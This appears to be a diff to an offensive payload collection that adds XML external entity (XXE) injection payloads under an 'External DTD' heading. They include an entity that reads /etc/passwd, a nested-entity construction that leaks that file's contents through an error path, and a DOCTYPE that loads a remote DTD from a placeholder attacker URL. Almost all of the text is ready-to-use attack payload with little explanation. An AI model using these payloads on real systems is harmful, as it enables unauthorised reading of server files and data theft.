@@ -18,3 +18,11 @@
 <text font-size="16" x="0" y="16">&xxe;</text>
 
 </svg>
+
+## External DTD
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> 
